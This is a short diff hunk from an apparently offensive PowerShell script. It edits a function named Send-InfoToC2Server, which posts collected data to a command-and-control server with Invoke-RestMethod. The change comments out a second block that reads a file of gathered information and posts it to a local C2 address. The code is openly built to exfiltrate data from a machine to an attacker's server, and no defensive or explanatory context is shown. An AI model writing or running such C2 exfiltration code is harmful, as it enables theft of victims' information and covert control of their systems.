@@ -59,10 +59,10 @@ function Send-InfoToC2Server {
     Invoke-RestMethod -Uri $c2Url -Method Post -Body $jsonBody -ContentType "application/json"
 
     
-    $c2Url = "http://127.0.0.1:5000/"
-    $data = Get-Content -Path $infoFilePath -Raw
+    # $c2Url = "http://127.0.0.1:5000/"
+    # $data = Get-Content -Path $infoFilePath -Raw
     # Using Invoke-WebRequest to send data to the C2 server
-    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
+    # Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
 }
 
 # Main execution flow
